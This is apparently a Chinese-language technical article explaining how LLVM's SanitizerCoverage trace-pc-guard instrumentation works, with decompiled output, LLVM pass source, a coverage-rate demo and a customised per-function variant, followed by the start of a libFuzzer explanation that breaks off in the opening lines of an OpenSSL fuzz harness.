<p>要想Clang引入Sanitizer-Coverage,需要提供编译参数<code>-fsanitize-coverage=trace-pc-guard</code>,编译命令如下:</p>
<pre><code class="language-makefile">all:
	clang -fsanitize-coverage=trace-pc-guard ./test_case.c -g -o ./test_case
</code></pre>
<p>把编译后的可执行程序<code>./test_case</code>拿到IDA逆向,可以发现LLVM Sanitizer-Coverage的插桩原理:</p>
<pre><code class="language-c">int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v3; // eax
  __int64 v4; // rdx
  int v5; // eax

  _sanitizer_cov_trace_pc_guard(&amp;unk_439BC0, argv, envp);
  v3 = rand();
  v4 = (unsigned int)(v3 &gt;&gt; 31);
  LODWORD(v4) = v3 % 2;
  if ( v3 % 2 )
  {
    _sanitizer_cov_trace_pc_guard((char *)&amp;unk_439BC0 + 4, argv, v4);
    v5 = rand();
    function1(v5 % 3);
  }
  else
  {
    _sanitizer_cov_trace_pc_guard((char *)&amp;unk_439BC0 + 8, argv, v4);
    function2();
  }
  return 0;
}
</code></pre>
<p>其中**_sanitizer_cov_trace_pc_guard()**就是插桩回调函数,如果没有重写该函数,那就LLVM就会使用默认版本,官方文档有一处示例代码,使用自定义该回调函数打印插桩分支信息.</p>
<pre><code class="language-c">//  多余注释已经删除,感兴趣可自行到官网查看
extern &quot;C&quot; void __sanitizer_cov_trace_pc_guard(uint32_t *guard) {
  if (!*guard) return;
  void *PC = __builtin_return_address(0);
  char PcDescr[1024];

  __sanitizer_symbolize_pc(PC, &quot;%p %F %L&quot;, PcDescr, sizeof(PcDescr));
  printf(&quot;guard: %p %x PC %s\n&quot;, guard, *guard, PcDescr);
}
</code></pre>
<p>把函数代码放到test_case.c中并添加相关头文件后,编译后执行效果如下:</p>
<pre><code class="language-sh">ubuntu@ubuntu-virtual-machine:~/Desktop/instrument_note$ ./test_case
guard: 0x439bc0 5 PC 0x423c06 in main /home/ubuntu/Desktop/instrument_note/./test_case.c:17
guard: 0x439bc4 6 PC 0x423c3b in main /home/ubuntu/Desktop/instrument_note/./test_case.c:19:19
guard: 0x439bb0 1 PC 0x423b6c in function1 /home/ubuntu/Desktop/instrument_note/./test_case.c:6
guard: 0x439bb4 2 PC 0x423b98 in function1 /home/ubuntu/Desktop/instrument_note/./test_case.c:8:9
ubuntu@ubuntu-virtual-machine:~/Desktop/instrument_note$
</code></pre>
<h4 id="一个简单的代码覆盖率demo"><a class="header" href="#一个简单的代码覆盖率demo">一个简单的代码覆盖率Demo</a></h4>
<p>统计程序的代码覆盖率需要两个要素:<code>当前程序所有分支总数/执行过的程序路径总数</code>.对于当前程序所有分支总数的获取,我们可以直接通过<code>__sanitizer_cov_trace_pc_guard()</code>统计得到,那么当前程序所有分支总数怎么获取呢?我们发现LLVM还提供了Sanitizer-Coverage初始化函数<code>__sanitizer_cov_trace_pc_guard_init()</code>,来看看它的声明.</p>
<pre><code class="language-c">void __sanitizer_cov_trace_pc_guard_init(uint32_t *start, uint32_t *stop);
</code></pre>
<p>其中,start和stop参数分别指的是插桩数据开始到结束的指针,那么只需要计算<code>stop-start</code>即可获取当前程序所有分支总数.</p>
<pre><code class="language-c">uint32_t __sancov_current_all_guard_count = 0;

void __sanitizer_cov_trace_pc_guard_init(uint32_t *start,uint32_t *stop) {
    __sancov_current_all_guard_count = (stop - start);

    printf(&quot;Sanitizer All Coverage edges: 0x%X \n&quot;,__sancov_current_all_guard_count);
}
</code></pre>
<pre><code class="language-sh">ubuntu@ubuntu-virtual-machine:~/Desktop/instrument_note$ make &amp;&amp; ./test_case
clang -fsanitize-coverage=trace-pc-guard ./test_case.c -g -o ./test_case
./test_case.c:31:3: warning: implicit declaration of function '__sanitizer_symbolize_pc' is invalid in C99 [-Wimplicit-function-declaration]
  __sanitizer_symbolize_pc(PC, &quot;%p %F %L&quot;, PcDescr, sizeof(PcDescr));
  ^
1 warning generated.
Sanitizer All Coverage edges: 0x7
ubuntu@ubuntu-virtual-machine:~/Desktop/instrument_note$
</code></pre>
<p>稍微对代码进行修改,就可以完成一个简单的代码覆盖率统计Demo</p>
<pre><code class="language-c">uint32_t __sancov_current_all_guard_count = 0;
uint32_t __sancov_current_execute_guard_count = 0;

void __sanitizer_cov_trace_pc_guard(uint32_t *guard) {
  if (!*guard) return;
  void *PC = __builtin_return_address(0);
  char PcDescr[1024];

  __sanitizer_symbolize_pc(PC, &quot;%p %F %L&quot;, PcDescr, sizeof(PcDescr));
  printf(&quot;guard: %p %x PC %s\n&quot;, guard, *guard, PcDescr);
  ++__sancov_current_execute_guard_count;
}

void __sanitizer_cov_trace_pc_guard_init(uint32_t *start,uint32_t *stop) {
    int index = 0;

    for (uint32_t *p = start;p &lt; stop;++p)  //  为什么这里要需要for循环初始化呢,下一章会提到
        *p = ++index;

    __sancov_current_all_guard_count = (stop - start);

    printf(&quot;Sanitizer All Coverage edges: 0x%X \n&quot;,__sancov_current_all_guard_count);
}

int main() {
    if (rand() % 2)
        function1(rand() % 3);
    else
        function2();

    printf(&quot;Coverage Rate:%.2f% (%d/%d)\n&quot;,
        __sancov_current_execute_guard_count,
        __sancov_current_all_guard_count,
        ((float)__sancov_current_execute_guard_count/(float)__sancov_current_all_guard_count) * 100);

    return 0;
}
</code></pre>
<pre><code class="language-sh">ubuntu@ubuntu-virtual-machine:~/Desktop/instrument_note$ make &amp;&amp; ./test_case
clang -fsanitize-coverage=trace-pc-guard ./test_case.c -g -o ./test_case
Sanitizer All Coverage edges: 0x7
guard: 0x439bc0 5 PC 0x423ca6 in main /home/ubuntu/Desktop/instrument_note/./test_case.c:41
guard: 0x439bc4 6 PC 0x423cdb in main /home/ubuntu/Desktop/instrument_note/./test_case.c:43:19
guard: 0x439bb0 1 PC 0x423c0c in function1 /home/ubuntu/Desktop/instrument_note/./test_case.c:30
guard: 0x439bb4 2 PC 0x423c38 in function1 /home/ubuntu/Desktop/instrument_note/./test_case.c:32:9
Coverage Rate:57.14% (4/7)
ubuntu@ubuntu-virtual-machine:~/Desktop/instrument_note$
</code></pre>
<h4 id="深入探索sanitizer-coverage实现"><a class="header" href="#深入探索sanitizer-coverage实现">深入探索Sanitizer-Coverage实现</a></h4>
<p>前一章节中留下了一个疑问,如果有自行使用这段代码编译运行就会发现,为什么用户自定义函数<code>__sanitizer_cov_trace_pc_guard_init()</code>之后,<code>__sanitizer_cov_trace_pc_guard()</code>就没有任何程序执行输出了?为什么<code>__sanitizer_cov_trace_pc_guard_init()</code>对start和stop初始化之后就可以成功运行了?为了深入理解这个问题,我们需要逆向Sanitizer-Coverage编译后的二进制程序.</p>
<p>我们阅读默认版本的<code>__sanitizer_cov_trace_pc_guard_init()</code>代码:</p>
<pre><code class="language-c">//  默认版本()
unsigned __int64 __usercall _sanitizer_cov_trace_pc_guard_init@&lt;rax&gt;(unsigned __int64 result@&lt;rax&gt;, unsigned __int64 a2@&lt;rdi&gt;, __sancov *a3@&lt;rsi&gt;, __m128i a4@&lt;xmm1&gt;, __m128i a5@&lt;xmm8&gt;)
{
  //  省略很多代码
  v5 = (_DWORD *)a2;  //  start
  if ( *(_DWORD *)a2 )
    return result;
  v6 = (unsigned __int64)a3;  //  stop
  //  省略很多代码
  do
   {
    *v5 = ++v8;
    ++v5;
   }
  while ( (unsigned __int64)v5 &lt; v6 );
  //  省略很多代码
  return result;
}
</code></pre>
<p>初始化函数会对start和stop这块内存区域进行计数写入,再来看看这块内存的分布.</p>
<pre><code class="language-assembly">__sancov_guards:0000000000439BB0 ; ===========================================================================
__sancov_guards:0000000000439BB0
__sancov_guards:0000000000439BB0 ; Segment type: Pure data
__sancov_guards:0000000000439BB0 ; Segment permissions: Read/Write
__sancov_guards:0000000000439BB0 __sancov_guards segment dword public 'DATA' use64
__sancov_guards:0000000000439BB0                 assume cs:__sancov_guards
__sancov_guards:0000000000439BB0                 ;org 439BB0h
__sancov_guards:0000000000439BB0                 public __start___sancov_guards
__sancov_guards:0000000000439BB0 ; uint32_t _start___sancov_guards[3]
__sancov_guards:0000000000439BB0 __start___sancov_guards dd 0            ; start参数起始地址
__sancov_guards:0000000000439BB4                 db    0
__sancov_guards:0000000000439BB5                 db    0
__sancov_guards:0000000000439BB6                 db    0
__sancov_guards:0000000000439BB7                 db    0
__sancov_guards:0000000000439BB8                 db    0
__sancov_guards:0000000000439BB9                 db    0
__sancov_guards:0000000000439BBA                 db    0
__sancov_guards:0000000000439BBB                 db    0
__sancov_guards:0000000000439BBC ; uint32_t guard
__sancov_guards:0000000000439BBC guard           dd 0
__sancov_guards:0000000000439BC0 ; uint32_t dword_439BC0[3]
__sancov_guards:0000000000439BC0 dword_439BC0    dd 0
__sancov_guards:0000000000439BC0
__sancov_guards:0000000000439BC4                 db    0
__sancov_guards:0000000000439BC5                 db    0
__sancov_guards:0000000000439BC6                 db    0
__sancov_guards:0000000000439BC7                 db    0
__sancov_guards:0000000000439BC8                 db    0
__sancov_guards:0000000000439BC9                 db    0
__sancov_guards:0000000000439BCA                 db    0
__sancov_guards:0000000000439BCB                 db    0
__sancov_guards:0000000000439BCB __sancov_guards ends
__sancov_guards:0000000000439BCB
LOAD:0000000000439BCC ; stop结束地址
</code></pre>
<p>这样来看这块内存数据不太容易理解,我们再读一下funtion1()的反汇编代码.</p>
<pre><code class="language-c">int __cdecl function1(int a)
{
  int v2; // [rsp+Ch] [rbp-4h]

  _sanitizer_cov_trace_pc_guard(_start___sancov_guards);  //  从start[0]读取数据调用trace_pc_guard()
  if ( a == 1 )
  {
    _sanitizer_cov_trace_pc_guard(&amp;_start___sancov_guards[1]);  //  从start[1]读取数据调用trace_pc_guard()
    v2 = 0;
  }
  else
  {
    _sanitizer_cov_trace_pc_guard(&amp;_start___sancov_guards[2]);  //  从start[2]读取数据调用trace_pc_guard()
    v2 = 1;
  }
  return v2;
}

// 执行function1()后的输出如下:
// guard: 0x439bb0 1 PC 0x423c1c in function1 /home/ubuntu/Desktop/instrument_note/./test_case.c:31
// guard: 0x439bb4 2 PC 0x423c48 in function1 /home/ubuntu/Desktop/instrument_note/./test_case.c:33:9

</code></pre>
<p>对<code>function1()</code>的逆向和运行可以发现,start[0]-start[2]的内存数据是用于保存当前执行的分支ID数据.综上所述,Sanitizer-Coverage会创造一块专用的区段用于保存插桩分支ID信息,但是这块内存默认是空数据,所以才需要<code>__sanitizer_cov_trace_pc_guard_init</code>遍历生成ID写入这块内存,后续<code>__sanitizer_cov_trace_pc_guard()</code>就可以成功从这里读取到分支ID数据.理解这个细节之后,再回来阅读上面的自定义<code>__sanitizer_cov_trace_pc_guard_init()</code>容易明白意义何在了.</p>
<pre><code class="language-c">//  用户自定义版本
void __cdecl _sanitizer_cov_trace_pc_guard_init(uint32_t *start, uint32_t *stop)
{
  uint32_t *p; // [rsp+0h] [rbp-20h]
  int index; // [rsp+Ch] [rbp-14h]

  index = 0;
  for ( p = start; p &lt;= stop; ++p )  // 初始化分支ID表
    *p = ++index;
  _sancov_current_all_guard_count = stop - start;  // 计算所有程序分支总数
  printf(&quot;Sanitizer All Coverage edges: 0x%X \n&quot;, (unsigned int)(stop - start), p);
}
</code></pre>
<h4 id="llvm-pass-for-sanitizercoveragecpp实现细节"><a class="header" href="#llvm-pass-for-sanitizercoveragecpp实现细节">LLVM Pass for SanitizerCoverage.cpp实现细节</a></h4>
<p>了解Sanitizer-Coverage的运行原理后,现在从Clang编译的角度去探索它是怎么做实现的.SanitizerCoverage的实现代码在LLVM的<code>\llvm-project\llvm\lib\Transforms\Instrumentation\SanitizerCoverage.cpp</code>目录.在阅读插桩代码之前简短提示下LLVM的Pass(优化模块)运行过程,插桩时一般用到ModulePass和FunctionPass,如果对整个代码文件进行处理时,那就用到ModulePass对象;如果对所有函数都处理,那就用到FunctionPass.PassManager控制所有Pass的执行过程.</p>
<pre><code class="language-c++">class ModuleSanitizerCoverageLegacyPass : public ModulePass {
public:
  bool runOnModule(Module &amp;M) override {
    ModuleSanitizerCoverage ModuleSancov(Options, Allowlist.get(),
                                         Blocklist.get());
    // Allowlist/Blocklist由参数-fsanitize-coverage-allowlist/-fsanitize-coverage-blocklist指定函数列表,有些场景下会用到
    auto DTCallback = [this](Function &amp;F) -&gt; const DominatorTree * {
      return &amp;this-&gt;getAnalysis&lt;DominatorTreeWrapperPass&gt;(F).getDomTree();
    };
    auto PDTCallback = [this](Function &amp;F) -&gt; const PostDominatorTree * {
      return &amp;this-&gt;getAnalysis&lt;PostDominatorTreeWrapperPass&gt;(F)
                  .getPostDomTree();
    };
    return ModuleSancov.instrumentModule(M, DTCallback, PDTCallback);
  }
}
</code></pre>
<p>ModulePass执行时的入口点在<code>runOnModule()</code>中,这里主要是把相关的参数传递给<code>instrumentModule()</code>.</p>
<pre><code class="language-c++">bool ModuleSanitizerCoverage::instrumentModule(
    Module &amp;M, DomTreeCallback DTCallback, PostDomTreeCallback PDTCallback) {
  if (Options.CoverageType == SanitizerCoverageOptions::SCK_None)
    return false;
  if (Allowlist &amp;&amp;
      !Allowlist-&gt;inSection(&quot;coverage&quot;, &quot;src&quot;, M.getSourceFileName()))
    return false;
  if (Blocklist &amp;&amp;
      Blocklist-&gt;inSection(&quot;coverage&quot;, &quot;src&quot;, M.getSourceFileName()))
    return false;
  C = &amp;(M.getContext());
  DL = &amp;M.getDataLayout();
  CurModule = &amp;M;
  CurModuleUniqueId = getUniqueModuleId(CurModule);
  TargetTriple = Triple(M.getTargetTriple());
  FunctionGuardArray = nullptr;
  Function8bitCounterArray = nullptr;
  FunctionBoolArray = nullptr;
  FunctionPCsArray = nullptr;
  IntptrTy = Type::getIntNTy(*C, DL-&gt;getPointerSizeInBits());
  IntptrPtrTy = PointerType::getUnqual(IntptrTy);
  Type *VoidTy = Type::getVoidTy(*C);
  IRBuilder&lt;&gt; IRB(*C);
  Int64PtrTy = PointerType::getUnqual(IRB.getInt64Ty());
  Int32PtrTy = PointerType::getUnqual(IRB.getInt32Ty());
  Int8PtrTy = PointerType::getUnqual(IRB.getInt8Ty());
  Int1PtrTy = PointerType::getUnqual(IRB.getInt1Ty());
  Int64Ty = IRB.getInt64Ty();
  Int32Ty = IRB.getInt32Ty();
  Int16Ty = IRB.getInt16Ty();
  Int8Ty = IRB.getInt8Ty();
  Int1Ty = IRB.getInt1Ty();

  SanCovTracePCIndir =
      M.getOrInsertFunction(SanCovTracePCIndirName, VoidTy, IntptrTy);
  // Make sure smaller parameters are zero-extended to i64 as required by the
  // x86_64 ABI.
  AttributeList SanCovTraceCmpZeroExtAL;
  if (TargetTriple.getArch() == Triple::x86_64) {
    SanCovTraceCmpZeroExtAL =
        SanCovTraceCmpZeroExtAL.addParamAttribute(*C, 0, Attribute::ZExt);
    SanCovTraceCmpZeroExtAL =
        SanCovTraceCmpZeroExtAL.addParamAttribute(*C, 1, Attribute::ZExt);
  }

  SanCovTraceCmpFunction[0] =
      M.getOrInsertFunction(SanCovTraceCmp1, SanCovTraceCmpZeroExtAL, VoidTy,
                            IRB.getInt8Ty(), IRB.getInt8Ty());
  SanCovTraceCmpFunction[1] =
      M.getOrInsertFunction(SanCovTraceCmp2, SanCovTraceCmpZeroExtAL, VoidTy,
                            IRB.getInt16Ty(), IRB.getInt16Ty());
  SanCovTraceCmpFunction[2] =
      M.getOrInsertFunction(SanCovTraceCmp4, SanCovTraceCmpZeroExtAL, VoidTy,
                            IRB.getInt32Ty(), IRB.getInt32Ty());
  SanCovTraceCmpFunction[3] =
      M.getOrInsertFunction(SanCovTraceCmp8, VoidTy, Int64Ty, Int64Ty);

  SanCovTraceConstCmpFunction[0] = M.getOrInsertFunction(
      SanCovTraceConstCmp1, SanCovTraceCmpZeroExtAL, VoidTy, Int8Ty, Int8Ty);
  SanCovTraceConstCmpFunction[1] = M.getOrInsertFunction(
      SanCovTraceConstCmp2, SanCovTraceCmpZeroExtAL, VoidTy, Int16Ty, Int16Ty);
  SanCovTraceConstCmpFunction[2] = M.getOrInsertFunction(
      SanCovTraceConstCmp4, SanCovTraceCmpZeroExtAL, VoidTy, Int32Ty, Int32Ty);
  SanCovTraceConstCmpFunction[3] =
      M.getOrInsertFunction(SanCovTraceConstCmp8, VoidTy, Int64Ty, Int64Ty);

  {
    AttributeList AL;
    if (TargetTriple.getArch() == Triple::x86_64)
      AL = AL.addParamAttribute(*C, 0, Attribute::ZExt);
    SanCovTraceDivFunction[0] =
        M.getOrInsertFunction(SanCovTraceDiv4, AL, VoidTy, IRB.getInt32Ty());
  }
  SanCovTraceDivFunction[1] =
      M.getOrInsertFunction(SanCovTraceDiv8, VoidTy, Int64Ty);
  SanCovTraceGepFunction =
      M.getOrInsertFunction(SanCovTraceGep, VoidTy, IntptrTy);
  SanCovTraceSwitchFunction =
      M.getOrInsertFunction(SanCovTraceSwitchName, VoidTy, Int64Ty, Int64PtrTy);

  Constant *SanCovLowestStackConstant =
      M.getOrInsertGlobal(SanCovLowestStackName, IntptrTy);
  SanCovLowestStack = dyn_cast&lt;GlobalVariable&gt;(SanCovLowestStackConstant);
  if (!SanCovLowestStack) {
    C-&gt;emitError(StringRef(&quot;'&quot;) + SanCovLowestStackName +
                 &quot;' should not be declared by the user&quot;);
    return true;
  }
  SanCovLowestStack-&gt;setThreadLocalMode(
      GlobalValue::ThreadLocalMode::InitialExecTLSModel);
  if (Options.StackDepth &amp;&amp; !SanCovLowestStack-&gt;isDeclaration())
    SanCovLowestStack-&gt;setInitializer(Constant::getAllOnesValue(IntptrTy));

  SanCovTracePC = M.getOrInsertFunction(SanCovTracePCName, VoidTy);
  SanCovTracePCGuard =
      M.getOrInsertFunction(SanCovTracePCGuardName, VoidTy, Int32PtrTy);

/*

static const char *const SanCovTracePCName = &quot;__sanitizer_cov_trace_pc&quot;;
static const char *const SanCovTraceCmp1 = &quot;__sanitizer_cov_trace_cmp1&quot;;
static const char *const SanCovTraceCmp2 = &quot;__sanitizer_cov_trace_cmp2&quot;;
static const char *const SanCovTraceCmp4 = &quot;__sanitizer_cov_trace_cmp4&quot;;
static const char *const SanCovTraceCmp8 = &quot;__sanitizer_cov_trace_cmp8&quot;;

*/
</code></pre>
<p>上面的逻辑代码逻辑主要就是从LLVMContext中获取常见变量类型和根据函数名获取SanitizerCoverage的内部函数以初始化,然后就遍历Module中的所有Function,开始插桩.</p>
<pre><code class="language-c++">  for (auto &amp;F : M)
    instrumentFunction(F, DTCallback, PDTCallback);
</code></pre>
<pre><code class="language-c++">
void ModuleSanitizerCoverage::instrumentFunction(
    Function &amp;F, DomTreeCallback DTCallback, PostDomTreeCallback PDTCallback) {
  if (F.empty())
    return;
  if (F.getName().find(&quot;.module_ctor&quot;) != std::string::npos)
    return; // Should not instrument sanitizer init functions.
  if (F.getName().startswith(&quot;__sanitizer_&quot;))
    return; // Don't instrument __sanitizer_* callbacks.
  // 省略很多不插桩的逻辑

  SmallVector&lt;Instruction *, 8&gt; IndirCalls;
  SmallVector&lt;BasicBlock *, 16&gt; BlocksToInstrument;
  SmallVector&lt;Instruction *, 8&gt; CmpTraceTargets;
  SmallVector&lt;Instruction *, 8&gt; SwitchTraceTargets;
  SmallVector&lt;BinaryOperator *, 8&gt; DivTraceTargets;
  SmallVector&lt;GetElementPtrInst *, 8&gt; GepTraceTargets;
  // 这些变量分别用于不同参数的插桩方法
  // -fsanitize-coverage=trace-pc-guard,indirect-calls,trace-cmp,trace-div,trace-gep

  for (auto &amp;BB : F) {  // 遍历当前函数所有BasicBlock代码块
    if (shouldInstrumentBlock(F, &amp;BB, DT, PDT, Options))
      BlocksToInstrument.push_back(&amp;BB);  // 记录所有可以进行插桩的BasicBlock
    for (auto &amp;Inst : BB) {  // 遍历BasicBlock中所有指令
      if (Options.IndirectCalls) {  // 如果启用参数-fsanitize-coverage=indirect-calls
        CallBase *CB = dyn_cast&lt;CallBase&gt;(&amp;Inst);
        if (CB &amp;&amp; !CB-&gt;getCalledFunction())  // 如果是Call指令,dyn_case会返回非NULL指针
          IndirCalls.push_back(&amp;Inst);  // 记录所有Call指令
      }
      if (Options.TraceCmp) {
        if (ICmpInst *CMP = dyn_cast&lt;ICmpInst&gt;(&amp;Inst))
          if (IsInterestingCmp(CMP, DT, Options))
            CmpTraceTargets.push_back(&amp;Inst);
        if (isa&lt;SwitchInst&gt;(&amp;Inst))
          SwitchTraceTargets.push_back(&amp;Inst);
      }
      if (Options.TraceDiv)
        if (BinaryOperator *BO = dyn_cast&lt;BinaryOperator&gt;(&amp;Inst))
          if (BO-&gt;getOpcode() == Instruction::SDiv ||
              BO-&gt;getOpcode() == Instruction::UDiv)
            DivTraceTargets.push_back(BO);
      if (Options.TraceGep)
        if (GetElementPtrInst *GEP = dyn_cast&lt;GetElementPtrInst&gt;(&amp;Inst))
          GepTraceTargets.push_back(GEP);
      if (Options.StackDepth)
        if (isa&lt;InvokeInst&gt;(Inst) ||
            (isa&lt;CallInst&gt;(Inst) &amp;&amp; !isa&lt;IntrinsicInst&gt;(Inst)))
          IsLeafFunc = false;
    }
  }

  // 经过多次遍历之后获取到很多BasicBlock和Inst,然后分别使用不同方法进行插桩
  InjectCoverage(F, BlocksToInstrument, IsLeafFunc);
  InjectCoverageForIndirectCalls(F, IndirCalls);
  InjectTraceForCmp(F, CmpTraceTargets);
  InjectTraceForSwitch(F, SwitchTraceTargets);
  InjectTraceForDiv(F, DivTraceTargets);
  InjectTraceForGep(F, GepTraceTargets);
}
</code></pre>
<p>由于文章篇幅关系,在此就只介绍<code>InjectCoverage()</code>的插桩逻辑,简单地说,接下来<code>InjectCoverage()</code>会直接根据前面的筛选出来的BlocksToInstrument的入口处插入对<code>__sanitizer_cov_trace_pc_guard()</code>函数调用.</p>
<pre><code class="language-c++">bool ModuleSanitizerCoverage::InjectCoverage(Function &amp;F, ArrayRef&lt;BasicBlock *&gt; AllBlocks,bool IsLeafFunc) {
  if (AllBlocks.empty()) return false;
    CreateFunctionLocalArrays(F, AllBlocks);  // 这里就是创建SantizerCoverage的分支ID记录内存区域
  for (size_t i = 0, N = AllBlocks.size(); i &lt; N; i++)
    InjectCoverageAtBlock(F, *AllBlocks[i], i, IsLeafFunc);  // 遍历所有BasicBlock
  return true;
}

void ModuleSanitizerCoverage::CreateFunctionLocalArrays(
    Function &amp;F, ArrayRef&lt;BasicBlock *&gt; AllBlocks) {
  if (Options.TracePCGuard)
    FunctionGuardArray = CreateFunctionLocalArrayInSection(
        AllBlocks.size(), F, Int32Ty, SanCovGuardsSectionName);  // 记住这个变量,这里的意思是根据当前获取到的所有BasicBlock的数量去创建一个整数数组,用于收集TracePCGuard插桩方法的分支ID记录内存区域
  // 省略其它代码
}

void ModuleSanitizerCoverage::InjectCoverageAtBlock(Function &amp;F, BasicBlock &amp;BB,size_t Idx,bool IsLeafFunc) {
  BasicBlock::iterator IP = BB.getFirstInsertionPt();
  bool IsEntryBB = &amp;BB == &amp;F.getEntryBlock();
  DebugLoc EntryLoc;
  if (IsEntryBB) {
    if (auto SP = F.getSubprogram())
      EntryLoc = DebugLoc::get(SP-&gt;getScopeLine(), 0, SP);
    // Keep static allocas and llvm.localescape calls in the entry block.  Even
    // if we aren't splitting the block, it's nice for allocas to be before
    // calls.
    IP = PrepareToSplitEntryBlock(BB, IP);
  } else {
    EntryLoc = IP-&gt;getDebugLoc();
  }

  IRBuilder&lt;&gt; IRB(&amp;*IP);  // 前面一通操作是为了获取BasicBlock的第一条指令
  // 省略其它代码
  if (Options.TracePCGuard) {
    auto GuardPtr = IRB.CreateIntToPtr(
        IRB.CreateAdd(IRB.CreatePointerCast(FunctionGuardArray, IntptrTy),
                      ConstantInt::get(IntptrTy, Idx * 4)),
        Int32PtrTy);  // 创建整数指针引用,等价于FunctionGuardArray[Idx]
    IRB.CreateCall(SanCovTracePCGuard, GuardPtr)-&gt;setCannotMerge();  // 使用前面创建的引用来创建函数调用,等价于__sanitizer_cov_trace_pc_guard(FunctionGuardArray[Idx]);
  }
  // 省略其它代码
}
</code></pre>
<p>完成所有插桩之后,最后一步就是程序启动时插入对<code>__sanitizer_cov_trace_pc_guard_init()</code>函数的调用.</p>
<pre><code class="language-c++">  Function *Ctor = nullptr;

  if (FunctionGuardArray)
    Ctor = CreateInitCallsForSections(M, SanCovModuleCtorTracePcGuardName,
                                      SanCovTracePCGuardInitName, Int32PtrTy,
                                      SanCovGuardsSectionName);
</code></pre>
<p>细心的读者可能会想起还有个细节没有提到,那就是LLVM默认的<code>__sanitizer_cov_trace_pc_guard_init()</code>函数再哪个地方声明引入的呢?其实这些LLVM内置的函数都在<code>Compiler-RT</code>中实现(后面ASAN会用到),代码目录在<code>\llvm-project\compiler-rt\lib\sanitizer_common</code>.</p>
<pre><code class="language-c++">// sanitizer_coverage_fuchsia.cpp

SANITIZER_INTERFACE_WEAK_DEF(void, __sanitizer_cov_trace_pc_guard_init,
                             u32 *start, u32 *end) {  // LLVM默认__sanitizer_cov_trace_pc_guard_init()函数实现代码
  if (start == end || *start)
    return;
  __sancov::pc_guard_controller.InitTracePcGuard(start, end);
}

void InitTracePcGuard(u32 *start, u32 *end) {  // 初始化分支ID内存区域
  if (end &gt; start &amp;&amp; *start == 0 &amp;&amp; common_flags()-&gt;coverage) {
    // Complete the setup before filling in any guards with indices.
    // This avoids the possibility of code called from Setup reentering
    // TracePcGuard.
    u32 idx = Setup(end - start);
    for (u32 *p = start; p &lt; end; ++p) {
      *p = idx++;
    }
  }
}
</code></pre>
<h4 id="定制sanitizercoverage"><a class="header" href="#定制sanitizercoverage">定制SanitizerCoverage</a></h4>
<p>笔者在实现Fuzzer的时候,遇到了个真实的场景.在使用二次开发或者针对某个模块做单元测试时,往往这个模块的代码只占程序全部代码的很小的部分.举个例子,如果模块代码只占全部代码的5%,但是Fuzzer的测试用例可以覆盖这个模块的80%代码,那么最后统计代码覆盖率是使用5%还是80%呢?笔者认为应该是80%的代码覆盖率才是最接近真实的,所以我的思路是:根据执行过的每个函数的总分支数除以每个函数执行过的分支数即可,示例图如下:</p>
<p><img src="./pic12/1.png" alt="" /></p>
<p>最终的结果是</p>
<pre><code>(6 + 2 + 1 + 1) / (10 + 4 + 1 + 2) = 58.82%
</code></pre>
<p>现在遇到的难题有两个:</p>
<ul>
<li>
<p>每个函数的分支总数怎么获取呢?</p>
</li>
<li>
<p>插桩只能获取到插桩处的PC地址,怎么样知道我们当前执行到了哪个函数地址?</p>
<p>为了实现这个功能,需要对原有的插桩代码做一些简短的修改,改动如下:</p>
</li>
</ul>
<pre><code class="language-c++">bool ModuleSanitizerCoverage::instrumentModule() {
   // ...
  SanCovTracePCGuard =
      M.getOrInsertFunction(SanCovTracePCGuardName, VoidTy, Int32PtrTy, Int32PtrTy, Int32PtrTy);  // 修改__sanitizer_cov_trace_pc_guard()的调用声明,改成__sanitizer_cov_trace_pc_guard(int,int,int)
   // ...
}

bool ModuleSanitizerCoverage::InjectCoverage(Function &amp;F,ArrayRef&lt;BasicBlock *&gt; AllBlocks,bool IsLeafFunc) {
  if (AllBlocks.empty()) return false;
  CreateFunctionLocalArrays(F, AllBlocks);
  for (size_t i = 0, N = AllBlocks.size(); i &lt; N; i++)
    InjectCoverageAtBlock(F, *AllBlocks[i], i, IsLeafFunc, N);  // 遍历出来的BasicBlock总数其实就是当前函数的所有分支
  return true;
}

void ModuleSanitizerCoverage::InjectCoverageAtBlock(Function &amp;F, BasicBlock &amp;BB,size_t Idx,bool IsLeafFunc,size_t EdgeCount) {  // 新增参数EdgeCount
   // ...
  if (Options.TracePCGuard) {
    std::vector&lt;Value*&gt; SanCovTracePCGuardArgumentList;  // 创建参数调用列表
    auto GuardPtr = IRB.CreateIntToPtr(
        IRB.CreateAdd(IRB.CreatePointerCast(FunctionGuardArray, IntptrTy),
                      ConstantInt::get(IntptrTy, Idx * 4)),
        Int32PtrTy);  // 从FunctionGuardArray中获取到的分支ID数据
    auto FunctionPtr = IRB.CreateIntToPtr(IRB.CreatePointerCast(static_cast&lt;Value*&gt;(&amp;F), IntptrTy),Int32PtrTy);  // 获取当前函数地址,转换为指针传递
    Constant* ConstFunctionInsideEdgeCount = ConstantInt::get(IntptrTy, EdgeCount);  //  获取当前函数分支总数,作为int值传递

    SanCovTracePCGuardArgumentList.push_back(GuardPtr);
    SanCovTracePCGuardArgumentList.push_back(ConstFunctionInsideEdgeCount);
    SanCovTracePCGuardArgumentList.push_back(FunctionPtr);

    IRB.CreateCall(SanCovTracePCGuard, static_cast&lt;ArrayRef&lt;Value *&gt;&gt;(SanCovTracePCGuardArgumentList))-&gt;setCannotMerge();
  }
   // ...
}
</code></pre>
<h2 id="libfuzzer原理"><a class="header" href="#libfuzzer原理">libFuzzer原理</a></h2>
<p>用过libFuzzer和AFL的读者们应该知道,这两款Fuzzer工具核心原理是:它们都会使用数据样本来生成测试数据集,然后使用新生成的测试数据调用程序执行并根据程序插桩的逻辑捕获到执行的分支信息,以此判断新的测试数据有没有发现新的执行路径,如果有发现新执行路径则记录测试数据,后续继续使用基于测试数据变异,不断以此循环.</p>
<p>关于libFuzzer最经典的教程在这里(https://github.com/Dor1s/libfuzzer-workshop),本文着重介绍libFuzzer工具本身的原理,不再复述libFuzzer的用法.</p>
<p>关于libFuzzer的实现代码,在LLVM的<code>\llvm-project\compiler-rt\lib\fuzzer\</code>目录下.</p>
<h4 id="libfuzzer执行fuzzer过程"><a class="header" href="#libfuzzer执行fuzzer过程">libFuzzer执行Fuzzer过程</a></h4>
<p>本章使用libFuzzer-workshop教程的OpenSSL心脏滴血漏洞来做讲解,相关代码在这里(https://github.com/Dor1s/libfuzzer-workshop/blob/master/lessons/05/openssl_fuzzer.cc),其中核心Fuzzing代码如下:</p>
<pre><code class="language-c++">extern &quot;C&quot; int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size) {
  static SSL_CTX *sctx = Init();
  SSL *server = SSL_new(sctx);
